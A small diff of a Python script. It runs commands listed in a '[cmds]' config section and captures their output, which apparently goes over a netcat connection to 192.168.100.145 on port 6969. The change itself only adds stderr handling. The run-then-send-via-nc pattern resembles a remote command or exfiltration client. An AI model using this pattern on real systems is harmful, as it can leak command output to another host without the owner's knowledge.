@@ -40,8 +40,8 @@ cmds = cc[cc.index('[cmds]')+1:]
 # run commands and report results
 cmd_results = {}
 for cmd in cmds:
-	c_proc = sp.Popen(cmd.split(' '), stdout=sp.PIPE)
-	cmd_results[cmd] = c_proc.stdout.read()
+	c_proc = sp.Popen(cmd.split(' '), stdout=sp.PIPE, stderr=sp.PIPE)
+	cmd_results[cmd], err = c_proc.communicate()
 
 nc = sp.Popen(['nc', '192.168.100.145', '6969'], stdin=sp.PIPE)
 try:
